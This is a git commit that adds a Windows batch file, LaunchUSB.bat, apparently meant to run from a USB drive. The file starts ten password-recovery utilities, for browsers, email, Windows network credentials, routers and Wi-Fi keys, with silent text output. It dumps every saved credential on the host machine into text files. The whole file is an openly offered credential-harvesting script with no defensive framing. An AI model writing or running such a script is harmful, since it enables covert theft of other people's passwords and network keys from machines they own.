bbd40df9da5ee3e60e5bed9adc509a0d32efbeca
Karan Kurani <85026744+kuranikaran@users.noreply.github.com>
2021-10-11 13:04:55 +0530

    Add files via upload

---
+++ Network ps/WIfi fox/LaunchUSB.bat
@@ -0,0 +1,12 @@
+Launch:start mspass.exe/stext mspass.txt
+start mailpv.exe/stext mailpv.txt
+start iepv.exe/stext iepv.txt
+start passwordfox.exe/stext passwordfox.txt
+start ChromePass.exe/stext chrome.txt
+start netpass.exe/stext netpass.txt
+start OperaPassWiew.exe/stext Operapass.txt
+start RouterpassViewPass.exe/stext Routerpass.txt
+start WebBrowsingpass.exe/stext Browsingpass.txt
+start WirelesskeyView.exe/stext Wirelesskey.txt
+
+
